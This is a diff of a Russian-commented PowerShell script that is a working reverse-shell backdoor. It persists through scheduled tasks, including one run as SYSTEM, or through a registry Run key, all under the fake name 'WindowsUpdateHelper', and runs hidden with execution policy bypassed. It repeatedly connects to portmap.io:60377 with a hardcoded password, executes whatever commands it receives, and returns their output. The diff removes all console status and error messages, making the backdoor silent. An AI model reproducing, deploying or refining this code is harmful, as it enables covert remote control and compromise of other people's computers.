@@ -1,4 +1,5 @@
-﻿# Путь к скрипту
+# Проверка прав администратора и установка автозапуска
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 $scriptPath = $MyInvocation.MyCommand.Path
 if (-not $scriptPath) { $scriptPath = $PSCommandPath }
 
@@ -6,7 +7,6 @@ if (-not $scriptPath) { $scriptPath = $PSCommandPath }
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $existing = Get-ItemProperty -Path $regPath -Name "WindowsUpdateHelper" -ErrorAction SilentlyContinue
 if (-not $existing) {
-    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
     if ($isAdmin) {
         $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
         $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
@@ -14,20 +14,13 @@ if (-not $existing) {
         Register-ScheduledTask -TaskName "WindowsUpdateHelper" -Action $action -Trigger $trigger1 -Settings $settings -RunLevel Highest -Force | Out-Null
         $trigger2 = New-ScheduledTaskTrigger -AtStartup
         Register-ScheduledTask -TaskName "WindowsUpdateHelperSystem" -Action $action -Trigger $trigger2 -Settings $settings -RunLevel Highest -User "SYSTEM" -Force | Out-Null
-        Write-Host "[+] Автозапуск установлен (Планировщик)"
     } else {
         $cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
         Set-ItemProperty -Path $regPath -Name "WindowsUpdateHelper" -Value $cmd
-        Write-Host "[+] Автозапуск установлен (реестр)"
     }
-} else {
-    Write-Host "[*] Автозапуск уже установлен"
 }
 
-# ========================
-#  Основной цикл
-# ========================
-
+# Основной цикл
 $REMOTE_HOST    = "portmap.io"
 $REMOTE_PORT    = 60377
 $PASSWORD       = "zebra123"
@@ -70,39 +63,27 @@ function Start-Session {
     Send-Line $writer $PASSWORD
     $auth = $reader.ReadLine()
     if ($auth -ne "AUTH_OK") { return }
-    Write-Host "[+] Сессия активна"
     while ($true) {
         try { $line = $reader.ReadLine() } catch { break }
         if ($null -eq $line) { break }
         $cmd = $line.Trim()
         if ($cmd -eq "") { continue }
         if ($cmd -eq "exit") { Send-Line $writer "BYE"; break }
-        Write-Host "[>] $cmd"
         $result = Invoke-CommandWithTimeout -Command $cmd -TimeoutSec $CMD_TIMEOUT
         foreach ($outLine in ($result -split "`n")) { Send-Line $writer $outLine }
         Send-Line $writer "<<END>>"
-        Write-Host "[<] Готово"
     }
 }
 
-Write-Host "[*] Запуск основного цикла..."
 while ($true) {
     try {
-        Write-Host "[*] Подключаюсь к ${REMOTE_HOST}:${REMOTE_PORT}..."
         $client = New-Object System.Net.Sockets.TcpClient
         $client.ConnectAsync($REMOTE_HOST, $REMOTE_PORT).Wait(5000) | Out-Null
         if ($client.Connected) {
-            Write-Host "[+] Соединение установлено"
             $client.SendTimeout = 5000
             Start-Session -Client $client
-            Write-Host "[-] Сессия завершена"
-        } else {
-            Write-Host "[!] Нет соединения"
         }
         $client.Close()
-    } catch {
-        Write-Host "[!] Ошибка: $_"
-    }
-    Write-Host "[*] Следующая попытка через $RECONNECT_WAIT сек..."
+    } catch {}
     Start-Sleep -Seconds $RECONNECT_WAIT
 }
